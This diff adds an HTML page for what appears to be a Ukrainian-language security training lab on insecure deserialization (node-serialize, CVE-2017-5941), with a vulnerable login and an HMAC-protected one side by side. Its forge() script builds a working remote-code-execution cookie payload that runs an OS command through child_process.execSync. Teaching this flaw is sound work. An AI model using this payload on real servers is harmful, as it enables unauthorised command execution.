@@ -1,0 +1,64 @@
+<!doctype html>
+<html lang="uk">
+<head>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <title>X08 · Insecure Deserialization</title>
+    <link rel="stylesheet" href="/style.css">
+</head>
+<body>
+<div class="container">
+    <h1>📦 X08: Insecure Deserialization</h1>
+    <p class="subtitle">OWASP A08:2025 — Software or Data Integrity Failures · node-serialize@0.0.4 (CVE-2017-5941)</p>
+    <div class="warning">⚠️ Пейлоад виконує команду ОС на сервері. Тільки localhost!</div>
+
+    <div class="grid">
+        <div class="card vuln">
+            <span class="badge vuln">Вразливо · node-serialize</span>
+            <h2>1. Звичайний вхід</h2>
+            <label>Ім’я</label><input id="u1" value="alice">
+            <button onclick="login('/login', 'u1', 'out1')">Увійти</button>
+            <button onclick="profile('/api/profile', 'out1')">Показати профіль</button>
+
+            <h2 style="margin-top:16px">2. Підробити cookie</h2>
+            <label>Команда ОС</label><input id="cmd" value="whoami">
+            <button class="danger" onclick="forge()">Згенерувати шкідливу cookie і відправити</button>
+            <label>Серіалізований пейлоад (до base64)</label>
+            <pre id="payload"></pre>
+            <pre id="out1"></pre>
+        </div>
+        <div class="card secure">
+            <span class="badge secure">Безпечно · HMAC + JSON</span>
+            <h2>Вхід</h2>
+            <label>Ім’я</label><input id="u2" value="alice">
+            <button class="ok" onclick="login('/login-secure', 'u2', 'out2')">Увійти</button>
+            <button class="ok" onclick="profile('/api/profile-secure', 'out2')">Показати профіль</button>
+            <p class="hint">Cookie має вигляд <code>base64url(JSON).HMAC</code>. Змінив хоч байт — отримаєш 403. Cookie з <code>HttpOnly</code>, тож з JS її не підробиш — спробуй через Burp/DevTools.</p>
+            <pre id="out2"></pre>
+        </div>
+    </div>
+</div>
+<script>
+    const show = (id, d) => document.getElementById(id).textContent = JSON.stringify(d, null, 2);
+
+    async function login(url, inputId, outId) {
+        const r = await fetch(url, { method: 'POST', headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify({ username: document.getElementById(inputId).value }) });
+        show(outId, await r.json());
+    }
+    async function profile(url, outId) {
+        show(outId, await (await fetch(url)).json());
+    }
+    async function forge() {
+        const cmd = document.getElementById('cmd').value.replace(/\\/g, '\\\\').replace(/'/g, "\\'");
+        const payload = JSON.stringify({
+            username: `_$$ND_FUNC$$_function(){return require('child_process').execSync('${cmd}').toString().trim()}()`
+        });
+        document.getElementById('payload').textContent = payload;
+        const b64 = btoa(unescape(encodeURIComponent(payload)));
+        document.cookie = 'profile=' + encodeURIComponent(b64) + '; path=/';
+        profile('/api/profile', 'out1');
+    }
+</script>
+</body>
+</html>
